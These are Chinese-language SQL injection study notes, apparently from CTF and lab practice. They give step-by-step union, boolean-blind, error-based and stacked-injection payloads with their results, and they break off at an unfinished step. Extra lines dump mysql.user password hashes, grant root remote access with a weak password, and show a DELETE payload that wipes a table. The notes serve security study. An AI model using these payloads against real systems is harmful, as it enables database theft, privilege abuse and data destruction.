## 掌控安全sql注入笔记

#### 第一关 数字型

##### 0x01 查字段

```mysql
http://injectx1.lab.aqlab.cn:81/Pass-01/index.php?id=1 order by 3
```

###### 获得字段为3

##### 0x02 查找库

```mysql
http://injectx1.lab.aqlab.cn:81/Pass-01/index.php?id=1 and 1=2 union select 1,database(),3
```

###### 获得库名为error

##### 0x03 查找表

```mysql
http://injectx1.lab.aqlab.cn:81/Pass-01/index.php?id=1 and 1=2 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='error'
```

###### 获得表名 error_flag,user

##### 0x04查找字段

```mysql
http://injectx1.lab.aqlab.cn:81/Pass-01/index.php?id=1 and 1=2 union select 1,group_concat(column_name),3 from information_schema.columns where table_name='error_flag'
```

###### 获得字段为Id,flag

##### 0x05查找内容

```mysql
http://injectx1.lab.aqlab.cn:81/Pass-01/index.php?id=1 and 1=2 union select 1,group_concat(flag),3 from error_flag
```

###### 获得数据为zKaQ-Nf

###### zKaQ-Nf,zKaQ-BJY,zKaQ-XiaoFang,zKaq-98K

###### //查找内容为Id和flag

```mysql
http://injectx1.lab.aqlab.cn:81/Pass-01/index.php?id=1 and 1=2 union select 1,group_concat(Id,0x7e,flag),3 from error_flag
```

###### 获得数据为1~zKaQ-Nf,2~zKaQ-BJY,3~zKaQ-XiaoFang,4~zKaq-98K

#### 第二关 字符型

##### 0x01查字段

```mysql
http://injectx1.lab.aqlab.cn:81/Pass-02/index.php?id=1' order by 3--+
```

###### 获得字段为3

##### 0x02查找库

```mysql
http://injectx1.lab.aqlab.cn:81/Pass-02/index.php?id=1' and 1=2 union select 1,database(),3--+
```

###### 库名为error

##### 0x03查找表

```mysql
http://injectx1.lab.aqlab.cn:81/Pass-02/index.php?id=1' and 1=2 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='error'--+
```

###### 获得表名error_flag,user

##### 0x04查找字段

```mysql
http://injectx1.lab.aqlab.cn:81/Pass-02/index.php?id=1' and 1=2 union select 1,group_concat(column_name),3 from information_schema.columns where table_name='error_flag'--+
```

###### 获得字段为Id,flag

##### 0x05查找内容

```mysql
http://injectx1.lab.aqlab.cn:81/Pass-02/index.php?id=1' and 1=2 union select 1,group_concat(flag),3 from error_flag--+
```

###### 获得内容为zKaQ-Nf,zKaQ-BJY,zKaQ-XiaoFang,zKaq-98K

#### 第三关 差不多

##### 0x01查字段

```mysql
http://injectx1.lab.aqlab.cn:81/Pass-03/index.php?id=1') order by 3--+
```

###### 获得字段为3

##### 0x02查找库

```mysql
http://injectx1.lab.aqlab.cn:81/Pass-03/index.php?id=1') and 1=2 union select 1,database(),3--+
```

###### 库名为error

##### 0x03查找表

```mysql
http://injectx1.lab.aqlab.cn:81/Pass-03/index.php?id=1') and 1=2 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='error'--+
```

###### 获得表名error_flag,user

##### 0x04查找字段

```mysql
http://injectx1.lab.aqlab.cn:81/Pass-03/index.php?id=1') and 1=2 union select 1,group_concat(column_name),3 from information_schema.columns where table_name='error_flag'--+ 
```

###### 获得字段为Id,flag

##### 0x05查找内容

```mysql
http://injectx1.lab.aqlab.cn:81/Pass-03/index.php?id=1') and 1=2 union select 1,group_concat(flag),3 from error_flag--+
```

###### 获得数据为zKaQ-Nf,zKaQ-BJY,zKaQ-XiaoFang,zKaq-98K

#### 第四关 差不多

##### 0x01查字段

```mysql
http://injectx1.lab.aqlab.cn:81/Pass-04/index.php?id=1") order by 3--+
```

###### 获得字段为3

##### 0x02查找库

```mysql
http://injectx1.lab.aqlab.cn:81/Pass-04/index.php?id=1") and 1=2 union select 1,database(),3--+
```

###### 获得库名为error

##### 0x03查找表

```mysql
http://injectx1.lab.aqlab.cn:81/Pass-04/index.php?id=1") and 1=2 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='error'--+
```

###### 获得表名为error_flag,user

##### 0x04查找字段

```mysql
http://injectx1.lab.aqlab.cn:81/Pass-04/index.php?id=1") and 1=2 union select 1,group_concat(column_name),3 from information_schema.columns where table_name='error_flag'--+
```

###### 获得字段名为Id,flag

##### 0x05查找内容

```mysql
http://injectx1.lab.aqlab.cn:81/Pass-04/index.php?id=1") and 1=2 union select 1,group_concat(flag),3 from error_flag--+
```

###### 获得内容zKaQ-Nf,zKaQ-BJY,zKaQ-XiaoFang,zKaq-98K

#### 第五关 **布尔盲注**

### 必须要了解的函数

#### `left(database(),1)>'s'`

#### #left(a,b)从左侧截取a的前b位

<hr>

#### `ascii(substr((select table_name from information_schema.tables where table_schema=database()limit 0,1),1,1))=101--+`

#### substr(a,b,c)从b位置开始,截取字符a的c长度

#### ascii()将某个字符转换为ascii值

<hr>

#### `ascii(substr((select database()),1,1))=98`

#### `ord(mid((select infull(cast(username as char),0x20)from security.users order by id limit 0,1),1,1))>98%23`

#### mid(a,b,c)从位置b开始,截取a字符串的c位

#### ord()函数同ascii(),将字符转为ascii值

<hr>









##### 0x01查找数据库长度  方式很多种！！

```mysql
/Pass-10/index.php?id=1+and+length(database())>=12  判断当前数据库长度
```

###### 12有数据13没数据判断长度为12

##### 0x02查找数据库各个位数的字符 方式很多种！！

- ```mysql
  /Pass-10/index.php?id=1+and+left(database(),1)='k'
  ```

  ###### 第一位为k时有数据

- ```mysql
  /Pass-10/index.php?id=1+and+left(database(),2)='ka'
  /Pass-10/index.php?id=1+and+left(database(),3)='kan'
  /Pass-10/index.php?id=1+and+left(database(),4)='kanw'
  /Pass-10/index.php?id=1+and+left(database(),5)='kanwo'
  /Pass-10/index.php?id=1+and+left(database(),6)='kanwol'
  /Pass-10/index.php?id=1+and+left(database(),7)='kanwolo'
  /Pass-10/index.php?id=1+and+left(database(),8)='kanwolon'
  /Pass-10/index.php?id=1+and+left(database(),9)='kanwolong'
  /Pass-10/index.php?id=1+and+left(database(),10)='kanwolongx'
  /Pass-10/index.php?id=1+and+left(database(),11)='kanwolongxi'
  /Pass-10/index.php?id=1+and+left(database(),12)='kanwolongxia'
  
  使用ascii函数或者substr函数方法也是差不多
  and ascii(substr(databse(),1,1))>97
  /Pass-10/index.php?id=1+and+ascii(substr(database(),1,1))<=107 第一个数为ascii(107) k
  ```

  ###### 可以判断当前数据库名为‘kanwolongxia’

##### 0x03查找当前数据库有几个表 方式很多种！！

- ```mysql
  /Pass-10/index.php?id=1+and+(select+count(table_name)+from+information_schema.tables+where+table_schema=database())=3
  ```

  ###### 用count函数来判断当前数据库(database())的表的个数databas()也可以替换成已知数据库名

##### 0x04查找需要的表名的长度 根据表的数量,逐个拆解表名

- ```mysql
  /Pass-10/index.php?id=1+and+length(substr((select+table_name+from+information_schema.tables+where+table_schema=database()+limit+0,1),1))>6					>6说明第一个表长度为6
  /Pass-10/index.php?id=1+and+length(substr((select+table_name+from+information_schema.tables+where+table_schema=database()+limit+1,1),1))>4					>4说明第二个表长度为4
	id=1+and+length(substr((select+table_name+from+information_schema.tables+where+table_schema=database()+limit+2,1),1))>4					 >4说明第三个表长度为4
  ```
  
  

##### 0x05查找需要的表名 根据表的数量,逐个拆解表名

- 

```mysql
第一个表的数据
表名第一位
/Pass-10/index.php?id=1+and+ascii(substr((select+table_name+from+information_schema.tables+where+table_schema=database()+limit+0,1),1,1))>108				ascii(108)表示为l
第二位
/Pass-10/index.php?id=1+and+ascii(substr((select+table_name+from+information_schema.tables+where+table_schema=database()+limit+0,1),2,1))>111				ascii(111)表示为o
第三位
/Pass-10/index.php?id=1+and+ascii(substr((select+table_name+from+information_schema.tables+where+table_schema=database()+limit+0,1),3,1))>102				ascii(102)表示为f
第四位
/Pass-10/index.php?id=id=1+and+ascii(substr((select+table_name+from+information_schema.tables+where+table_schema=database()+limit+0,1),4,1))>108			ascii(108)表示为l
第五位
/Pass-10/index.php?id=1+and+ascii(substr((select+table_name+from+information_schema.tables+where+table_schema='kanwolongxia'+limit+0,1),5,1))>97			ascii(97)表示为a
/Pass-10/index.php?
第六位
id=1+and+ascii(substr((select+table_name+from+information_schema.tables+where+table_schema='kanwolongxia'+limit+0,1),6,1))>103			 ascii(103)表示位g
#第七位
id=1+and+ascii(substr((select+table_name+from+information_schema.tables+where+table_schema='kanwolongxia'+limit+0,1),7,1))=0			等于0表示空格( )
最后为loflag

第二个表的数据
第一位
/Pass-10/index.php?id=1+and+ascii(substr((select+table_name+from+information_schema.tables+where+table_schema=database()+limit+1,1),1,1))>110				ascii(110)表示为n
第二位
/Pass-10/index.php?id=1+and+ascii(substr((select+table_name+from+information_schema.tables+where+table_schema=database()+limit+1,1),2,1))>101				ascii(101)表示为e
第三位
/Pass-10/index.php?id=1+and+ascii(substr((select+table_name+from+information_schema.tables+where+table_schema=database()+limit+1,1),3,1))>119				ascii(119)表示为w
第四位
/Pass-10/index.php?id=1+and+ascii(substr((select+table_name+from+information_schema.tables+where+table_schema=database()+limit+1,1),4,1))>115				ascii(115)表示为s
最后为news

第三个表的数据
第一位
/Pass-10/index.php?id=1+and+ascii(substr((select+table_name+from+information_schema.tables+where+table_schema=database()+limit+2,1),1,1))>117				ascii(117)表示为u
第二位
/Pass-10/index.php?id=1+and+ascii(substr((select+table_name+from+information_schema.tables+where+table_schema=database()+limit+2,1),2,1))>115				ascii(115)表示为s
第三位
/Pass-10/index.php?id=1+and+ascii(substr((select+table_name+from+information_schema.tables+where+table_schema=database()+limit+2,1),3,1))>101				ascii(101)表示为e
第四位
/Pass-10/index.php?id=1+and+ascii(substr((select+table_name+from+information_schema.tables+where+table_schema=database()+limit+2,1),4,1))>114				ascii(114)表示为r
最后为user

```

##### 0x06查找表中的字段和长度

```mysql
首先猜解表中字段的数量
/Pass-10/index.php?id=1+and+(select+count(column_name)+from+information_schema.columns+where+table_name='loflag')=2
		=2说明loflag表有2个字段
/Pass-10/index.php?id=1+and+(select+count(column_name)+from+information_schema.columns+where+table_name='news')=2
		=2说明news表同样有2个字段
/Pass-10/index.php?id=1+and+(select+count(column_name)+from+information_schema.columns+where+table_name='user')>15
		>15没结果>14有结果说明user表有15个字段

接着猜解表中的字段名长度
loflag表中第一个字段为2个字符长度
/Pass-10/index.php?id=1+and+length(substr((select+column_name+from+information_schema.columns+where+table_name='loflag'+limit+0,1),1))=2
loflag表中第二个字段为6个字符长度
/Pass-10/index.php?id=1+and+length(substr((select+column_name+from+information_schema.columns+where+table_name='loflag'+limit+1,1),1))=6		可以采用二分法
```

##### 0x07查找表中的字段名

```mysql
二分法查找
loflag表第一个字段第一位为ascii(73)	为I
/Pass-10/index.php?id=1+and+ascii(substr((select+column_name+from+information_schema.columns+where+table_name='loflag'+limit+0,1),1,1))>73
loflag表第一个字段第二位为ascii(100)	为d
/Pass-10/index.php?id=1+and+ascii(substr((select+column_name+from+information_schema.columns+where+table_name='loflag'+limit+0,1),2,1))>100

loflag表第二个字段第一位为ascii(102)	为f
/Pass-10/index.php?id=1+and+ascii(substr((select+column_name+from+information_schema.columns+where+table_name='loflag'+limit+1,1),1,1))>102
loflag表第二个字段第二位为ascii(108)	为l
/Pass-10/index.php?id=1+and+ascii(substr((select+column_name+from+information_schema.columns+where+table_name='loflag'+limit+1,1),2,1))>108
loflag表第二个字段第三位为ascii(97)	为a
/Pass-10/index.php?id=1+and+ascii(substr((select+column_name+from+information_schema.columns+where+table_name='loflag'+limit+1,1),3,1))>97
loflag表第二个字段第四位为ascii(103)	为g
/Pass-10/index.php?id=1+and+ascii(substr((select+column_name+from+information_schema.columns+where+table_name='loflag'+limit+1,1),4,1))>103
loflag表第二个字段第五位为ascii(108)	为l
/Pass-10/index.php?id=1+and+ascii(substr((select+column_name+from+information_schema.columns+where+table_name='loflag'+limit+1,1),5,1))>108
loflag表第二个字段第六位为ascii(111)	为o
/Pass-10/index.php?id=1+and+ascii(substr((select+column_name+from+information_schema.columns+where+table_name='loflag'+limit+1,1),6,1))>111
```

##### 0x08查找表中的内容

```mysql
查找Id字段的第一行为ascii(49) 为1
/Pass-10/index.php?id=1+and+ascii(substr((select+Id+from+loflag+limit+0,1),1,1))>49
查找Id字段的第二行为ascii(50) 为2
/Pass-10/index.php?id=1+and+ascii(substr((select+Id+from+loflag+limit+1,1),1,1))>50
查找Id字段的第三行为ascii(51) 为3
/Pass-10/index.php?id=1+and+ascii(substr((select+Id+from+loflag+limit+2,1),1,1))>51
查找Id字段的第四行为ascii(52) 为4
/Pass-10/index.php?id=1+and+ascii(substr((select+Id+from+loflag+limit+3,1),1,1))>52
查找Id字段的第五行为ascii(53) 为5
/Pass-10/index.php?id=1+and+ascii(substr((select+Id+from+loflag+limit+4,1),1,1))>53


先看看各个数据的长度
>8说明flaglo字段的第一行的数据的长度为8
/Pass-10/index.php?id=1+and+length(substr((select+flaglo+from+loflag+limit+0,1),1))>8
>7说明flaglo字段的第二行的数据的长度为7
/Pass-10/index.php?id=1+and+length(substr((select+flaglo+from+loflag+limit+1,1),1))>7
>10说明flaglo字段的第三行的数据的长度为10
/Pass-10/index.php?id=1+and+length(substr((select+flaglo+from+loflag+limit+2,1),1))>10
>12说明flaglo字段的第四行的数据的长度为12
/Pass-10/index.php?id=1+and+length(substr((select+flaglo+from+loflag+limit+3,1),1))>12
>14说明flaglo字段的第五行的数据的长度为14
/Pass-10/index.php?id=1+and+length(substr((select+flaglo+from+loflag+limit+4,1),1))>14


查找flaglo字段的第一行第一个字符为ascii(122) 为z
/Pass-10/index.php?id=1+and+ascii(substr((select+flaglo+from+loflag+limit+0,1),1,1))>122
查找flaglo字段的第一行第二个字符为ascii(75) 为K
/Pass-10/index.php?id=1+and+ascii(substr((select+flaglo+from+loflag+limit+0,1),2,1))>75
查找flaglo字段的第一行第三个字符为ascii(97) 为a
/Pass-10/index.php?id=1+and+ascii(substr((select+flaglo+from+loflag+limit+0,1),3,1))>97
查找flaglo字段的第一行第四个字符为ascii(81) 为Q
/Pass-10/index.php?id=1+and+ascii(substr((select+flaglo+from+loflag+limit+0,1),4,1))>81
查找flaglo字段的第一行第五个字符为ascii(45) 为-
/Pass-10/index.php?id=1+and+ascii(substr((select+flaglo+from+loflag+limit+0,1),5,1))>45
查找flaglo字段的第一行第六个字符为ascii(81) 为Q
/Pass-10/index.php?id=1+and+ascii(substr((select+flaglo+from+loflag+limit+0,1),6,1))>81
查找flaglo字段的第一行第七个字符为ascii(81) 为Q
/Pass-10/index.php?id=1+and+ascii(substr((select+flaglo+from+loflag+limit+0,1),7,1))>81
查找flaglo字段的第一行第八个字符为ascii(81) 为Q
/Pass-10/index.php?id=1+and+ascii(substr((select+flaglo+from+loflag+limit+0,1),8,1))>81
数据为zKaQ-QQQ

查找flaglo字段的第二行第一个字符为ascii(122) 为z
/Pass-10/index.php?id=1+and+ascii(substr((select+flaglo+from+loflag+limit+1,1),1,1))>122
查找flaglo字段的第二行第二个字符为ascii(75) 为K
/Pass-10/index.php?id=1+and+ascii(substr((select+flaglo+from+loflag+limit+1,1),2,1))>75
查找flaglo字段的第二行第三个字符为ascii(97) 为a
/Pass-10/index.php?id=1+and+ascii(substr((select+flaglo+from+loflag+limit+1,1),3,1))>97
查找flaglo字段的第二行第四个字符为ascii(81) 为Q
/Pass-10/index.php?id=1+and+ascii(substr((select+flaglo+from+loflag+limit+1,1),4,1))>81
查找flaglo字段的第二行第五个字符为ascii(45) 为-
/Pass-10/index.php?id=1+and+ascii(substr((select+flaglo+from+loflag+limit+1,1),5,1))>45
查找flaglo字段的第二行第六个字符为ascii(82) 为R
/Pass-10/index.php?id=1+and+ascii(substr((select+flaglo+from+loflag+limit+1,1),6,1))>82
查找flaglo字段的第二行第七个字符为ascii(82) 为D
/Pass-10/index.php?id=1+and+ascii(substr((select+flaglo+from+loflag+limit+1,1),7,1))>68
获得数据为zKaQ-RD

查找flaglo字段的第三行第一个字符为ascii(122) 为z
/Pass-10/index.php?id=1+and+ascii(substr((select+flaglo+from+loflag+limit+2,1),1,1))>122
查找flaglo字段的第三行第二个字符为ascii(75) 为K
/Pass-10/index.php?id=1+and+ascii(substr((select+flaglo+from+loflag+limit+2,1),2,1))>75
查找flaglo字段的第三行第三个字符为ascii(97) 为a
/Pass-10/index.php?id=1+and+ascii(substr((select+flaglo+from+loflag+limit+2,1),3,1))>97
查找flaglo字段的第三行第四个字符为ascii(81) 为Q
/Pass-10/index.php?id=1+and+ascii(substr((select+flaglo+from+loflag+limit+2,1),4,1))>81
查找flaglo字段的第三行第五个字符为ascii(45) 为-
/Pass-10/index.php?id=1+and+ascii(substr((select+flaglo+from+loflag+limit+2,1),5,1))>45
查找flaglo字段的第三行第六个字符为ascii(77) 为M
/Pass-10/index.php?id=1+and+ascii(substr((select+flaglo+from+loflag+limit+2,1),6,1))>77
查找flaglo字段的第三行第七个字符为ascii(111) 为o
/Pass-10/index.php?id=1+and+ascii(substr((select+flaglo+from+loflag+limit+2,1),7,1))>111
查找flaglo字段的第三行第八个字符为ascii(114) 为r
/Pass-10/index.php?id=1+and+ascii(substr((select+flaglo+from+loflag+limit+2,1),8,1))>114
查找flaglo字段的第三行第九个字符为ascii(101) 为e
/Pass-10/index.php?id=1+and+ascii(substr((select+flaglo+from+loflag+limit+2,1),9,1))>101
查找flaglo字段的第三行第十个字符为ascii(110) 为n
/Pass-10/index.php?id=1+and+ascii(substr((select+flaglo+from+loflag+limit+2,1),10,1))>110
获得数据为zKaQ-Moren

查找flaglo字段的第四行第一个字符为ascii(122) 为z
/Pass-10/index.php?id=1+and+ascii(substr((select+flaglo+from+loflag+limit+3,1),1,1))>122
查找flaglo字段的第四行第二个字符为ascii(75) 为K
/Pass-10/index.php?id=1+and+ascii(substr((select+flaglo+from+loflag+limit+3,1),2,1))>75
查找flaglo字段的第四行第三个字符为ascii(97) 为a
/Pass-10/index.php?id=1+and+ascii(substr((select+flaglo+from+loflag+limit+3,1),3,1))>97
查找flaglo字段的第四行第四个字符为ascii(81) 为Q
/Pass-10/index.php?id=1+and+ascii(substr((select+flaglo+from+loflag+limit+3,1),4,1))>81
查找flaglo字段的第四行第五个字符为ascii(45) 为-
/Pass-10/index.php?id=1+and+ascii(substr((select+flaglo+from+loflag+limit+3,1),5,1))>45
查找flaglo字段的第四行第六个字符为ascii(116) 为t
/Pass-10/index.php?id=1+and+ascii(substr((select+flaglo+from+loflag+limit+3,1),6,1))>116
查找flaglo字段的第四行第七个字符为ascii(105) 为i
/Pass-10/index.php?id=1+and+ascii(substr((select+flaglo+from+loflag+limit+3,1),7,1))>105
查找flaglo字段的第四行第八个字符为ascii(109) 为m
/Pass-10/index.php?id=1+and+ascii(substr((select+flaglo+from+loflag+limit+3,1),8,1))>109
查找flaglo字段的第四行第九个字符为ascii(101) 为e
/Pass-10/index.php?id=1+and+ascii(substr((select+flaglo+from+loflag+limit+3,1),9,1))>101
查找flaglo字段的第四行第10个字符为ascii(45) 为-
/Pass-10/index.php?id=1+and+ascii(substr((select+flaglo+from+loflag+limit+3,1),10,1))>45
查找flaglo字段的第四行第11个字符为ascii(104) 为h
/Pass-10/index.php?id=1+and+ascii(substr((select+flaglo+from+loflag+limit+3,1),11,1))>104
查找flaglo字段的第四行第12个字符为ascii(106) 为j
/Pass-10/index.php?id=1+and+ascii(substr((select+flaglo+from+loflag+limit+3,1),12,1))>106
获得数据为zKaQ-time-hj


查找flaglo字段的第五行第一个字符为ascii(122) 为z
/Pass-10/index.php?id=1+and+ascii(substr((select+flaglo+from+loflag+limit+4,1),1,1))>122
查找flaglo字段的第五行第二个字符为ascii(75) 为K
/Pass-10/index.php?id=1+and+ascii(substr((select+flaglo+from+loflag+limit+4,1),2,1))>75
查找flaglo字段的第五行第三个字符为ascii(97) 为a
/Pass-10/index.php?id=1+and+ascii(substr((select+flaglo+from+loflag+limit+4,1),3,1))>97
查找flaglo字段的第五行第四个字符为ascii(81) 为Q
/Pass-10/index.php?id=1+and+ascii(substr((select+flaglo+from+loflag+limit+4,1),4,1))>81
查找flaglo字段的第五行第五个字符为ascii(45) 为-
/Pass-10/index.php?id=1+and+ascii(substr((select+flaglo+from+loflag+limit+4,1),5,1))>45
查找flaglo字段的第五行第六个字符为ascii(116) 为t
/Pass-10/index.php?id=1+and+ascii(substr((select+flaglo+from+loflag+limit+4,1),6,1))>116
查找flaglo字段的第五行第七个字符为ascii(105) 为i
/Pass-10/index.php?id=1+and+ascii(substr((select+flaglo+from+loflag+limit+4,1),7,1))>105
查找flaglo字段的第五行第八个字符为ascii(109) 为m
/Pass-10/index.php?id=1+and+ascii(substr((select+flaglo+from+loflag+limit+4,1),8,1))>109
查找flaglo字段的第五行第九个字符为ascii(101) 为e
/Pass-10/index.php?id=1+and+ascii(substr((select+flaglo+from+loflag+limit+4,1),9,1))>101
查找flaglo字段的第五行第10个字符为ascii(45) 为-
/Pass-10/index.php?id=1+and+ascii(substr((select+flaglo+from+loflag+limit+4,1),10,1))>45
查找flaglo字段的第五行第11个字符为ascii(122) 为z
/Pass-10/index.php?id=1+and+ascii(substr((select+flaglo+from+loflag+limit+4,1),11,1))>122
查找flaglo字段的第五行第12个字符为ascii(120) 为x
/Pass-10/index.php?id=1+and+ascii(substr((select+flaglo+from+loflag+limit+4,1),12,1))>120
查找flaglo字段的第五行第13个字符为ascii(120) 为x
/Pass-10/index.php?id=1+and+ascii(substr((select+flaglo+from+loflag+limit+4,1),13,1))>120
查找flaglo字段的第五行第14个字符为ascii(122) 为z
/Pass-10/index.php?id=1+and+ascii(substr((select+flaglo+from+loflag+limit+4,1),14,1))>122
获得数据为zKaQ-time-zxxz
```















查数据库版本

‘ or updatexml(1,concat(0x7e,(select version())),1),1)--+abc

' or updatexml(1,concat(0x7e,(select database())),1),1)--+abc

查数据库表名

' or updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1)),1),1)--+abc

查字段名

' or updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_schema=database() and table_name='flag_head' limit 1,1)),1),1)--+abc

查询数据

' or updatexml(1,concat(0x7e,(select flag_h1 from flag_head limit 0,1)),1),1)--+abc























































































显示版本：select version();

显示字符集：select @@character_set_database;

显示数据库show databases;

显示表名：show tables;

显示计算机名：select @@hostname;

显示系统版本：select @@version_compile_os;

显示mysql路径：select @@basedir;

显示数据库路径：select @@datadir;

显示root密码：select User,Password from mysql.user;

开启外连：GRANT ALL PRIVILEGES ON *.* TO ‘root’@’%’ IDENTIFIED BY ‘123456’ WITH GRANT OPTION;







### 报错注入

https://blog.csdn.net/weixin_44732566/article/details/104417351

```mysql
1 count()：count()函数返回匹配指定条件的行数。count(*)函数返回表中的记录数
2 floor()：floor:函数是用来向下取整呢个的，相当于去掉小数部分
3 rand()：rand()是随机取（0，1）中的一个数，但是给它一个参数后0，即rand(0),并且传如floor()后，即：floor(rand(0)*2)它就不再是随机了，序列0110110
4 concat()：用于连接两个字符串
5 group by x:x就是相当于 as x,设一个别名
6 0x26：16进制数值，ASCII为“&”，在回显中起到分隔作用
```

##### 来自ctfhub

#### 0x01查看当前数据库

```mysql
http://challenge-64527b908d03fcbc.sandbox.ctfhub.com:10080/?id=1+union+select+count(*),concat(database(),0x7e,floor(rand(0)*2))x+from+information_schema.columns+group+by+x;

获取database()
1 union select count(*),concat(database(),0x7e,floor(rand(0)*2))x from information_schema.columns group by x;

显示报错
select * from news where id=1 union select count(*),concat(database(),0x7e,floor(rand(0)*2))x from information_schema.columns group by x;
查询错误: Duplicate entry 'sqli~1' for key 'group_key' 
```



#### 0x02查看数据表

```mysql
http://challenge-64527b908d03fcbc.sandbox.ctfhub.com:10080/?id=1+Union+select+count(*),concat((select+table_name+from+information_schema.tables+where+table_schema='sqli'+limit+0,1),0x7e,floor(rand(0)*2))x+from+information_schema.columns+group+by+x

获取第一个表使用limit 0,1区分
1 Union select count(*),concat((select table_name from information_schema.tables where table_schema='sqli' limit 0,1),0x7e,floor(rand(0)*2))x from information_schema.columns group by x

显示报错
select * from news where id=1 Union select count(*),concat((select table_name from information_schema.tables where table_schema='sqli' limit 0,1),0x7e,floor(rand(0)*2))x from information_schema.columns group by x
查询错误: Duplicate entry 'news~1' for key 'group_key' 



http://challenge-64527b908d03fcbc.sandbox.ctfhub.com:10080/?id=1+Union+select+count(*),concat((select+table_name+from+information_schema.tables+where+table_schema='sqli'+limit+1,1),0x7e,floor(rand(0)*2))x+from+information_schema.columns+group+by+x


获取第二个表使用limit 1,1区分
1 Union select count(*),concat((select table_name from information_schema.tables where table_schema='sqli' limit 1,1),0x7e,floor(rand(0)*2))x from information_schema.columns group by x


显示报错
select * from news where id=1 Union select count(*),concat((select table_name from information_schema.tables where table_schema='sqli' limit 1,1),0x7e,floor(rand(0)*2))x from information_schema.columns group by x
查询错误: Duplicate entry 'flag~1' for key 'group_key' 
```



#### 0x03查看数据表字段

```mysql
http://challenge-64527b908d03fcbc.sandbox.ctfhub.com:10080/?id=1+Union+select+count(*),concat((select+column_name+from+information_schema.columns+where+table_schema='sqli'+and+table_name='flag'+limit+0,1),0x7e,floor(rand(0)*2))x+from+information_schema.columns+group+by+x

获取flag数据表字段第一个字段 limit 0,1区分
1 Union select count(*),concat((select column_name from information_schema.columns where table_schema='sqli' and table_name='flag' limit 0,1),0x7e,floor(rand(0)*2))x from information_schema.columns group by x

显示报错
select * from news where id=1 Union select count(*),concat((select column_name from information_schema.columns where table_schema='sqli' and table_name='flag' limit 0,1),0x7e,floor(rand(0)*2))x from information_schema.columns group by x
查询错误: Duplicate entry 'flag~1' for key 'group_key' 



http://challenge-64527b908d03fcbc.sandbox.ctfhub.com:10080/?id=1+Union+select+count(*),concat((select+column_name+from+information_schema.columns+where+table_schema='sqli'+and+table_name='flag'+limit+1,1),0x7e,floor(rand(0)*2))x+from+information_schema.columns+group+by+x

查询第二个字段时发现查询正确所以只有一个字段
1 Union select count(*),concat((select column_name from information_schema.columns where table_schema='sqli' and table_name='flag' limit 1,1),0x7e,floor(rand(0)*2))x from information_schema.columns group by x


select * from news where id=1 Union select count(*),concat((select column_name from information_schema.columns where table_schema='sqli' and table_name='flag' limit 1,1),0x7e,floor(rand(0)*2))x from information_schema.columns group by x
查询正确 
```



#### 0x04查看字段数据

```mysql
http://challenge-64527b908d03fcbc.sandbox.ctfhub.com:10080/?id=1+Union+select+count(*),concat((select+flag+from+flag+limit+0,1),0x7e,floor(rand(0)*2))x+from+information_schema.columns+group+by+x

获取flag表的flag字段
1 union select count(*),concat((select flag from flag limit 0,1),0x7e,floor(rand(0)*2))x from information_schema.columns group by x

显示报错
查询错误: Duplicate entry 'ctfhub{39e4f9cc9bccc105b7d41f97}~1' for key 'group_key' 
```







































####  堆叠注入原理 

```
在SQL中，分号（;）是用来表示一条sql语句的结束。试想一下我们在 ; 结束一个sql语句后继续构造下一条语句，会不会一起执行？因此这个想法也就造就了堆叠注入。而union injection（联合注入）也是将两条语句合并在一起，两者之间有什么区别么？区别就在于union 或者union all执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。例如以下这个例子。用户输入：1; DELETE FROM products服务器端生成的sql语句为：（因未对输入的参数进行过滤）Select * from products where productid=1;DELETE FROM products当执行查询后，第一条显示查询信息，第二条则将整个表进行删除。
```

















## 强网杯2019 



# 取材于某次真实环境渗透，只说一句话：开发和安全缺一不可

#### supersqli

http://220.249.52.133:40492/?inject=1

### 0x01 获取数据库名

**1)可以使用sqlmap注入出数据库名但是获取不了数据**

### 0x02 选择手注获取字段

```mysql
http://220.249.52.133:40492/?inject=1' order by 1,2--+
有数据回显

array(2) {
  [0]=>
  string(1) "1"
  [1]=>
  string(7) "hahahah"
}

http://220.249.52.133:40492/?inject=1' order by 1,2,3--+
无数据回显
error 1054 : Unknown column '3' in 'order clause'
```



### 0x03 选择手注获取字段

```mysql
http://220.249.52.133:40492/?inject=1' and 1=2 union select 1,database()--+
存在匹配关键字
return preg_match("/select|update|delete|drop|insert|where|\./i",$inject);

```



### 0x04 选择手注获取数据库名

```mysql
http://220.249.52.133:40492/?inject=1';show databases--+
使用mysql堆叠注入
array(2) {
  [0]=>
  string(1) "1"
  [1]=>
  string(7) "hahahah"
}

array(1) {
  [0]=>
  string(11) "ctftraining"
}

array(1) {
  [0]=>
  string(18) "information_schema"
}

array(1) {
  [0]=>
  string(5) "mysql"
}

array(1) {
  [0]=>
  string(18) "performance_schema"
}

array(1) {
  [0]=>
  string(9) "supersqli"
}

array(1) {
  [0]=>
  string(4) "test"
}

```



### 0x05 选择手注获取表

```mysql
http://220.249.52.133:40492/?inject=1';use supersqli;show tables--+
#http://220.249.52.133:40492/?inject=1';show tables--+	操作同样可以
使用mysql堆叠注入
array(2) {
  [0]=>
  string(1) "1"
  [1]=>
  string(7) "hahahah"
}

array(1) {
  [0]=>
  string(16) "1919810931114514"
}

array(1) {
  [0]=>
  string(5) "words"
}




```





### 0x06 选择手注获取字段名

```mysql
http://220.249.52.133:40492/?inject=1';show columns from words;--+
使用mysql堆叠注入
array(2) {
  [0]=>
  string(1) "1"
  [1]=>
  string(7) "hahahah"
}

array(6) {
  [0]=>
  string(2) "id"
  [1]=>
  string(7) "int(10)"
  [2]=>
  string(2) "NO"
  [3]=>
  string(0) ""
  [4]=>
  NULL
  [5]=>
  string(0) ""
}

array(6) {
  [0]=>
  string(4) "data"
  [1]=>
  string(11) "varchar(20)"
  [2]=>
  string(2) "NO"
  [3]=>
  string(0) ""
  [4]=>
  NULL
  [5]=>
  string(0) ""
}


http://220.249.52.133:40492/?inject=1';show columns from `1919810931114514`;--+
使用mysql堆叠注入
array(2) {
  [0]=>
  string(1) "1"
  [1]=>
  string(7) "hahahah"
}

array(6) {
  [0]=>
  string(4) "flag"
  [1]=>
  string(12) "varchar(100)"
  [2]=>
  string(2) "NO"
  [3]=>
  string(0) ""
  [4]=>
  NULL
  [5]=>
  string(0) ""
}



```





### 0x07 选择手注更改表的字段查看flag

```mysql
参考链接
